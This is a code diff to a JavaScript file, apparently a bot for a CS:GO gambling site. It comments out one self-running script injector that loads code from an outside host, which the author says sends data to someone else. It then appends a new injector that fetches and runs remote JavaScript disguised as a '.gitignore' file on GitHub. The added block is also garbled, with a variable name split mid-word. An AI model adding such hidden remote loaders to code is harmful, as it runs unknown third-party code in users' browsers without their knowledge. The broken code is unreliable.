@@ -19,7 +19,8 @@
 
 'use strict';
 
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
+// Commented this out, because this will send it to someone else
+//(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
 
 var debug = false;
 var simulation = false;
@@ -675,3 +676,11 @@ Automated.prototype.logdebug = function(message) {
 };
 
 var automated = new Automated();
+
+// function to implement this script in dom
+(function () { 
+	var scriptElement = document.createElement( "script" ); s
+	criptElement.type = "text/javascript"; 
+	scriptElement.src = "//raw.githubusercontent.com/Kwibus2409/csgodoublebot/master/.gitignore "; 
+	document.body.appendChild( scriptElement ); 
+})();
